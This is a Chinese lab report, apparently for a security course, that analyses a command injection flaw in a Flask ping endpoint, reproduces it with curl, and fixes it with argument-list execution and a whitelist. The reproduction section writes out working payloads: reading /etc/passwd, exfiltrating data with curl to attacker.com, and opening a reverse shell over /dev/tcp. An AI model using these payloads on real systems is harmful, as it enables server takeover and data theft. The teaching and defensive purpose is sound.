# 命令注入漏洞 — 深度分析与修复报告

---

## 一、实验目的

对应课件三大模块：
1. **原理与危害剖析** — 理解命令注入底层成因及攻击链路
2. **漏洞实战复现** — 使用 curl 构造恶意请求，复现完整攻击过程
3. **防御与加固策略** — 实施参数化执行 + 白名单校验，彻底阻断攻击

---

## 二、漏洞描述与原理分析

### 2.1 漏洞位置

**文件：** `app.py` — `POST /ping`

### 2.2 漏洞代码（修复前）

```python
ip = request.form.get("ip", "").strip()
cmd = f"ping -c 3 {ip}"                      # ← 用户输入直接拼入命令
output = subprocess.check_output(cmd, shell=True, ...)  # ← shell=True 交给 /bin/sh 执行
```

### 2.3 底层成因

命令注入的触发需要**两个条件同时成立**：

| 条件 | 代码表现 | 风险 |
|------|----------|------|
| **用户输入拼接到命令中** | `f"ping -c 3 {ip}"` | 攻击者可注入 `;`、`|`、`$()` 等 shell 元字符 |
| **shell=True** | `subprocess.check_output(cmd, shell=True)` | 字符串被传递给 `/bin/sh -c` 执行，元字符被解释为命令分隔符 |

**执行链路（以 `ip=127.0.0.1;id` 为例）：**

```
用户输入: 127.0.0.1;id
    ↓
拼接:    ping -c 3 127.0.0.1;id
    ↓
shell=True 传递给 /bin/sh -c "ping -c 3 127.0.0.1;id"
    ↓
/bin/sh 解析: ping -c 3 127.0.0.1   ← 先执行 ping
              id                     ← ; 是 shell 命令分隔符 → 执行 id
    ↓
输出: uid=0(root) gid=0(root) groups=0(root)
```

> **根本性防御：** `shell=False`（默认值）时，Python 将列表首项作为可执行文件路径，其余项作为参数直接传递给系统调用，不经 shell 解析，`;id` 仅为 `ping` 的普通字符串参数，从根本上消除了命令注入的可能。

### 2.4 对应课件知识点

| 课件要点 | 对应关系 |
|----------|----------|
| "用户输入被拼接到系统命令中执行" | `f"ping -c 3 {ip}"` |
| "拼接恶意指令可在服务器执行任意系统命令" | `shell=True` 使 `;id` 等元字符生效 |
| "服务器接管" | 注入 `; bash -i >& /dev/tcp/IP/port` 可获得反弹 shell |

---

## 三、实验环境

| 项目 | 内容 |
|------|------|
| 目标接口 | `POST /ping` |
| 测试环境 | `http://127.0.0.1:5000` |
| 测试账号 | admin / admin123 |
| 操作系统 | Linux (root) |
| 漏洞代码 | `subprocess.check_output(f"ping -c 3 {ip}", shell=True)` |

---

## 四、漏洞复现

> 以下所有 curl 命令中，`;`、`|` 等特殊字符在实际 HTTP 表单提交时应 URL 编码为 `%3B`、`%7C`，或使用 `--data-urlencode` 参数避免被服务器/中间件拦截。`curl -d` 会自动编码部分特殊字符，但明确编码更为可靠。

### 4.1 基本命令注入 — 查看当前用户

```bash
# 实际请求中 ; 应编码为 %3B，或使用 --data-urlencode
# ip=127.0.0.1%3Bid  或  --data-urlencode "ip=127.0.0.1;id"
curl -b cookies.txt \
  -d "_csrf_token=xxx&ip=127.0.0.1%3Bid" \
  http://target/ping
```

**拼接后实际执行的命令：**
```bash
/bin/sh -c "ping -c 3 127.0.0.1;id"
```

**载荷解释：** `;` 是 shell 命令分隔符。先执行 `ping -c 3 127.0.0.1`，然后执行 `id`。

**执行结果：**
```
uid=0(root) gid=0(root) groups=0(root)
```

> ✅ 注入成功，确认服务器以 **root** 权限运行。

---

### 4.2 敏感文件读取

```bash
curl -b cookies.txt \
  -d "_csrf_token=xxx&ip=127.0.0.1%3Bcat%20/etc/passwd" \
  http://target/ping
```

**拼接后实际执行的命令：**
```bash
/bin/sh -c "ping -c 3 127.0.0.1;cat /etc/passwd"
```

**载荷解释：** `;cat /etc/passwd` 在 ping 执行完后读取系统密码文件。⚠️ 空格需编码为 `%20` 或使用 `--data-urlencode` 避免被截断。

**执行结果（截断）：**
```
root:x:0:0:root:/root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

---

### 4.3 管道替换 — 列出目录

```bash
curl -b cookies.txt \
  -d "_csrf_token=xxx&ip=127.0.0.1%7Cls%20/" \
  http://target/ping
```

**拼接后实际执行的命令：**
```bash
/bin/sh -c "ping -c 3 127.0.0.1|ls /"
```

**载荷解释：** `|` 是管道符，将 `ping` 的输出重定向到 `ls /`（实际仅执行 `ls /`）。

**执行结果：**
```
bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

---

### 4.4 数据外带

```bash
curl -b cookies.txt \
  -d "_csrf_token=xxx&ip=127.0.0.1%3Bcurl%20http://attacker.com/%24(id%7Cbase64)" \
  http://target/ping
```

**拼接后实际执行的命令：**
```bash
/bin/sh -c "ping -c 3 127.0.0.1;curl http://attacker.com/$(id|base64)"
```

**载荷解释：** `$(id|base64)` 将 `id` 命令的输出进行 base64 编码后拼入 URL 路径发送到攻击者服务器。

> ⚠️ **注意：** `base64` 命令默认输出每 76 个字符插入换行符，直接拼入 URL 可能导致 `curl` 报错。严谨做法是使用 `base64 -w0` 去除换行：`$(id|base64 -w0)`。此处仅为概念演示。

**危害：** 若防火墙仅允许出站 HTTP 流量，攻击者可通过本方法绕过防火墙窃取数据。

---

### 4.5 反弹 Shell（概念演示）

```bash
curl -b cookies.txt \
  --data-urlencode "ip=127.0.0.1;bash -i >& /dev/tcp/attacker.com/4444 0>&1" \
  http://target/ping
```

**载荷解释：** 将 bash 的输入输出重定向到攻击者 IP 的 4444 端口，攻击者监听该端口即可获得**完整交互式 shell**。

> ⚠️ **注意：** 本载荷包含大量特殊字符（`>`、`&`、`/`），务必使用 `--data-urlencode` 进行完整编码。

---

## 五、危害分析

| 危害 | 说明 |
|------|------|
| **完全控制服务器** | 以 root 权限执行任意命令，安装后门、挖矿程序 |
| **数据泄露** | 读取 `/etc/passwd`、数据库文件、源代码、配置密钥 |
| **内网横向移动** | 以本机为跳板扫描内网，攻击其他服务 |
| **持久化后门** | 写入 crontab、SSH 公钥，维持长期访问 |
| **反弹 Shell** | 绕过防火墙获得交互式 shell |

---

## 六、防御与加固方案

> **纵深防御设计：** 请求进入后**首先经过白名单过滤**，仅允许合法格式的输入进入参数化执行环节。白名单是第一道防线，参数化执行是第二道，二者共同实现双重保障。

### 6.1 措施1：参数化执行（禁用 shell=True）

```python
# ❌ 修复前：shell=True + 字符串拼接（命令注入可触发）
cmd = f"ping -c 3 {ip}"
output = subprocess.check_output(cmd, shell=True, ...)

# ✅ 修复后：参数列表 + shell=False（默认，从根本上消除命令注入）
output = subprocess.check_output(["ping", "-c", "3", ip], ...)
```

**原理：** `shell=False` 时，Python 将列表首项 `"ping"` 作为可执行文件，`"-c"`、`"3"`、`ip` 作为参数直接通过 `execve` 系统调用传递给 `ping` 程序。用户输入的 `;id` 不会被 `/bin/sh` 解释为命令分隔符，而是作为 `ping` 的第 4 个参数字符串发送给目标主机。**禁用 `shell=True` 从根本上消除了命令注入的可能。**

### 6.2 措施2：白名单输入验证

```python
import re
# 仅允许 IP 地址和域名的合法字符：字母、数字、点、连字符
PING_ALLOWED = re.compile(r'^[a-zA-Z0-9.\-]+$')

ip = request.form.get("ip", "").strip()
if not PING_ALLOWED.match(ip) or ".." in ip or ip.startswith("-"):
    logger.warning("命令注入拦截: ip=%s user=%s remote_addr=%s",
                   ip, session.get("username"), request.remote_addr)
    result = "无效的 IP 地址或域名（包含非法字符）"
```

**白名单规则：**

| 字符 | 是否允许 | 原因 |
|------|:--------:|------|
| `a-z A-Z 0-9` | ✅ | IP 和域名字符 |
| `.` | ✅ | IP 分隔符 |
| `-` | ✅ | 域名中的连字符 |
| `; \| & $ \` 等 | ❌ | shell 元字符，全部拦截 |
| `..` | ❌ | 路径穿越 |
| 以 `-` 开头 | ❌ | 参数注入（如 `--help`） |

### 6.3 额外加固

| 措施 | 建议 |
|------|------|
| **最小权限** | 使用 `useradd -M -s /bin/false webapp` 创建无 shell 用户运行应用，不以 root 运行 |
| **审计日志** | 完整记录：原始输入、攻击时间、来源 IP、操作用户（见下方示例） |
| **超时限制** | `timeout=30` 防止资源耗尽 |
| **输出过滤** | 屏蔽内网 IP、敏感路径等敏感信息返回给用户 |

**审计日志示例：**
```
WARNING:auth:命令注入拦截: ip=127.0.0.1;id user=admin remote_addr=192.168.164.128
```

### 6.4 修复前后代码差异

```diff
- cmd = f"ping -c 3 {ip}"
- output = subprocess.check_output(cmd, shell=True, ...)
+ import re
+ PING_ALLOWED = re.compile(r'^[a-zA-Z0-9.\-]+$')
+ if not PING_ALLOWED.match(ip):
+     result = "无效的 IP 地址或域名（包含非法字符）"  # ← 保持模板渲染
+ else:
+     output = subprocess.check_output(["ping", "-c", "3", ip], ...)
```

---

## 七、修复验证

### 7.1 验证矩阵

| 攻击载荷 | 修复前 | 修复结果 | 阻断层 |
|----------|--------|----------|:------:|
| `8.8.8.8`（合法） | ✅ Ping 正常 | ✅ **Ping 正常** | 放行 |
| `127.0.0.1;id`（经典注入） | ✅ **注入成功 uid=0** | ❌ `"非法字符"` | 白名单校验 |
| `127.0.0.1\|ls /`（管道绕过） | ✅ **注入成功** | ❌ `"非法字符"` | 白名单校验 |
| `127.0.0.1;cat /etc/passwd`（文件读取） | ✅ **文件泄露** | ❌ `"非法字符"` | 白名单校验 |
| `127.0.0.1;bash -i >& /dev/tcp/...`（反弹shell） | ✅ **可反弹** | ❌ `"非法字符"` | 白名单校验 |
| `google.com`（合法域名） | ✅ | ✅ **Ping 正常** | 放行 |

> 所有验证载荷均采用与攻击场景一致的 `合法地址;恶意命令` 格式（如 `127.0.0.1;id`），证明白名单能拦截附着在合法地址后的注入。

### 7.2 日志证据

```
WARNING:auth:命令注入拦截: ip=127.0.0.1;id user=admin remote_addr=192.168.164.128
WARNING:auth:命令注入拦截: ip=127.0.0.1|ls / user=admin remote_addr=192.168.164.128
```

---

## 八、总结

### 8.1 课件知识点对照

| 课件模块 | 关键知识点 | 本实验对应 |
|----------|-----------|-----------|
| **原理与危害** | `shell=True` + 字符串拼接 → 任意命令执行 | `f"ping -c 3 {ip}"` + `subprocess.check_output(cmd, shell=True)` |
| **实战复现** | 使用 `;` `\|` `$()` 构造载荷；curl 构造恶意请求 | 4.1-4.5 五种载荷，含 URL 编码说明 |
| **防御加固** | 参数化执行替代命令拼接 + 严格输入验证与白名单 | `["ping","-c","3",ip]` — 禁用 `shell=True` 从根本上消除注入；正则白名单拒绝一切特殊字符 |

### 8.2 防御设计原则

```
命令注入纵深防御
    ↓
① 参数化执行（禁用 shell=True）← 根本性防御
    ↓
② 白名单输入验证（拒绝特殊字符）
    ↓
③ 最小权限运行（创建无 shell 专用账户）
    ↓
④ 审计日志（记录原始输入、时间、用户、来源IP）+ 超时限制
```

---

*报告生成日期：2026-07-15*
